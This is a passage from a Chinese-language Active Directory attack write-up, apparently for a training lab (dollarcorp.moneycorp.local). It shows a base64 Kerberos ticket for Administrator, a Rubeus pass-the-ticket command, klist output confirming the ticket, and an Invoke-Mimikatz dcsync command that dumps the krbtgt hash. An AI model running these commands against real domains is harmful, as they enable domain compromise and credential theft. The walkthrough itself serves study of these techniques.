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
+```
+
+怎么利用TGT？
+
+利用命令：```.\Rubeus.exe ptt /ticket:<TGTofDCORP-DC$>```
+
+
+导入成功
+
+用klist命令查看ticket
+```
+PS C:\ad> klist
+
+Current LogonId is 0:0x2516e
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+        Start Time: 2/21/2022 2:26:00 (local)
+        End Time:   2/21/2022 12:26:00 (local)
+        Renew Time: 2/28/2022 2:26:00 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+因为现在我们已经有了DA权限，可以使用dcsync导出dcorp\krbtgt的NTML哈希
+```
+PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
